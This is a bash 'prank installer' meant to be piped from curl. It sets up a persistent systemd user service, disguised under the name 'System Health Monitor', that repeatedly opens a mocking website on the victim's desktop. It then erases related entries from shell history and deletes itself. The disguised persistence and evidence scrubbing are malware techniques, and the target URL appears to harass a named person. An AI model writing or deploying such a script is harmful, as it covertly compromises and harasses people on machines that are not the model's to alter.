#!/bin/bash
# Prank installer — sets up a service that opens a site with 31% chance every 31 seconds
# Usage: curl -sL https://raw.githubusercontent.com/USER/REPO/main/run.sh | bash

HELPER_DIR="$HOME/.local/bin"
HELPER_SCRIPT="$HELPER_DIR/prank_opener.sh"
SERVICE_DIR="$HOME/.config/systemd/user"
SERVICE_FILE="$SERVICE_DIR/prank-opener.service"

# ---------- 1. Create helper script ----------
mkdir -p "$HELPER_DIR"
cat > "$HELPER_SCRIPT" << 'HELPER'
#!/bin/bash
# Resolve the active graphical session so xdg-open can reach the desktop
if [ -z "$DISPLAY" ]; then
    export DISPLAY=:0
fi
if [ -z "$DBUS_SESSION_BUS_ADDRESS" ]; then
    export DBUS_SESSION_BUS_ADDRESS="unix:path=/run/user/$(id -u)/bus"
fi

while true; do
    ROLL=$(( RANDOM % 100 + 1 ))
    if [ "$ROLL" -le 31 ]; then
        xdg-open " https://keremgaymi.gay" >/dev/null 2>&1 &
    fi
    sleep 31
done
HELPER
chmod +x "$HELPER_SCRIPT"

# ---------- 2. Create systemd user service ----------
mkdir -p "$SERVICE_DIR"
cat > "$SERVICE_FILE" << EOF
[Unit]
Description=System Health Monitor
After=graphical-session.target

[Service]
Type=simple
ExecStart=$HELPER_SCRIPT
Restart=on-failure
RestartSec=5

[Install]
WantedBy=default.target
EOF

# ---------- 3. Enable & start ----------
systemctl --user daemon-reload
systemctl --user enable prank-opener.service
systemctl --user start  prank-opener.service

# ---------- 4. Scrub from shell history ----------
# Remove traces from bash history file
for HIST_FILE in "$HOME/.bash_history" "$HOME/.local/share/fish/fish_history"; do
    if [ -f "$HIST_FILE" ]; then
        sed -i '/run\.sh/d;/prank/d;/mysecretsite/d;/prank_opener/d;/prank-opener/d' "$HIST_FILE"
    fi
done
# Clear in-memory bash history and reload clean version
history -c 2>/dev/null
history -r 2>/dev/null

# ---------- 5. Clean up evidence ----------
SELF="$(realpath "$0" 2>/dev/null)"
if [ -f "$SELF" ]; then
    rm -f "$SELF"
fi

echo "Done ✓"
